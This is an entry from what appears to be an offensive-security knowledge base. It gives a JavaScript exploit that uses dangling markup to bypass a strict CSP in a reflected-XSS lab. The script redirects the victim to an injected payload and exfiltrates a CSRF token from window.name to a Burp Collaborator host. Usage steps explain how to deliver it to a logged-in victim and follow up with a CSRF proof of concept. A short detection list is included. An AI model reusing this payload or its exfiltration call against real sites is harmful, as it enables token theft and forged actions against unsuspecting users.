---
id: d6ca5c8d-b617-4ff0-802f-a50edd28faa3
type: code
language: javascript
verified: true
created_at: '2020-08-25T10:08:59.214423+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
platforms:
  - Web
tags:
  - xss
  - csrf
  - exfiltration
validated: true
---

# Dangling-Markup-CSRF-Token-Exfiltration-Script

## Code

```javascript
<script>
if(window.name) {
    new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
    } else {
        location = 'https://your-lab-id.web-security-academy.net/email?email=%22%3E%3Ca%20href=%22https://your-exploit-server-id.web-security-academy.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
</script>
```

## Description

This JavaScript code implements a dangling markup attack to bypass strict CSP in a reflected XSS vulnerability. On initial load, it redirects to the vulnerable endpoint with a payload that injects an anchor tag linking back to the exploit and a dangling <base target=''> tag. When the victim clicks the link, the page reloads the script, but now window.name contains the CSRF token (set by the vulnerable page), which is exfiltrated via an image src to a Burp Collaborator URL.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| your-collaborator-id.burpcollaborator.net | Unique Burp Collaborator subdomain for receiving exfiltrated data | abc123.burpcollaborator.net |
| your-lab-id.web-security-academy.net | Target lab/application domain with the reflected XSS | lab-123.web-security-academy.net |
| your-exploit-server-id.web-security-academy.net | Exploit server domain for hosting this script | exploit-456.web-security-academy.net |

## Usage

Host this code on an exploit server and deliver the URL to a logged-in victim. The victim must click the reflected "Click me" link for exfiltration to occur. Use in conjunction with Burp Collaborator to capture the token, then craft a CSRF PoC. This is specific to applications that set window.name to the CSRF token on the vulnerable page.

## Detection

- CSP violation reports for image loads to unknown domains.
- Anomalous redirects or location changes in JavaScript.
- Monitoring for window.name access in client-side scripts.
- Web application firewall (WAF) rules blocking incomplete <base> tags or reflected anchors.
- Out-of-band DNS/HTTP requests to collaborator-like domains.

## Related

- [[procedures/Bypass-Strict-CSP-in-Reflected-XSS-via-Dangling-Markup-for-CSRF-Token-Exfiltration]]
- [[tools/Burp-Suite]]
